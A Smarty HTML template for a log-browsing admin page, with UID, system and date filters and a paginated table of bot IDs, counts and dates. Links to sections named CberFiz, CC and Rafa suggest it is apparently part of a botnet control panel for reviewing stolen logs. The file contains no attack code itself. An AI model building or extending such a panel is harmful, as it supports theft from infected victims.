{if $_SESSION.user->config.infoacc ne 1}
<div class="top_menu">

<div class="top_menu_left">

{if $_SESSION.user->access.logs.cberfiz eq on}<a href="/logs/cberfiz.html">CberFiz</a>&nbsp;{/if}
{if $_SESSION.user->access.logs.cc eq on}<a href="/logs/cc.html">CC</a>&nbsp;{/if}
{if $_SESSION.user->access.logs.rafa eq on}<a href="/logs/rafa.html">Rafa</a>&nbsp;{/if}

</div>
<div class="top_menu_right">

</div>

</div>
{/if}
<hr />

<form action="#" method="post" enctype="multipart/form-data" name="logs_filter" id="logs_filter" target="_blank">

<div style="text-align: right; padding-right: 10px; padding-left: 10px">

UID: <input name="uid" type="text" style="width:600px" value="{$_SESSION.search.logs.uid}"/>
<hr />
Система: <select id="sys" name="sys" style="width:600px">
<option value="ALL">{$lang.all}</option>
{foreach from=$sys key=key item=item}
<option value="{$key}"{if $_SESSION.search.logs.sys eq $key} selected="selected"{/if}>{$item}</option>
{/foreach}
</select>
<hr />
Дата: <select id="date" name="date" style="width:600px">
<option value="ALL">{$lang.all}</option>
{foreach from=$date key=key item=item}
<option value="{$key}"{if $_SESSION.search.logs.date eq $key} selected="selected"{/if}>{$key}</option>
{/foreach}
</select>
<hr />
<input type="button" name="update" value="Обновить" style="width:100%" onclick="return get_hax({ldelim}url: '/logs/index.html?ajax=1',method:'post',id:'content',form:'logs_filter'{rdelim});" />
</div>
</form>

<div style="font-size:10px" align="center"><br />&nbsp;{$pages}&nbsp;<br /><br /></div>

<table cellspacing="1" cellpadding="5" style="width: 100%; border: 1px solid #cccccc;">
<tr class="bgp3">
<td style="width: 20%; text-align: center">{$lang.bot}</td>
<td style="width: 50%; text-align: center">{$lang.count}</td>
<td style="width: 50%; text-align: center">{$lang.data}</td>
</tr>
{foreach from=$list item=item key=key name=list}
{if $smarty.foreach.list.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bgp{$bg}" onmousemove="this.className = 'bgp4'" onmouseout="this.className = 'bgp{$bg}'" style="border: 1px solid #FFFFFF; cursor:pointer;" onclick="gbw('{$item->prefix}{$item->uid}');">
<th>{$item->prefix}{$item->uid}</th>
<th>{$item->count}</th>
<th>{$item->post_date}</th>
</tr>
{/foreach}
</table>



<div style="font-size:10px" align="center"><br />&nbsp;{$pages}&nbsp;<br /><br /></div>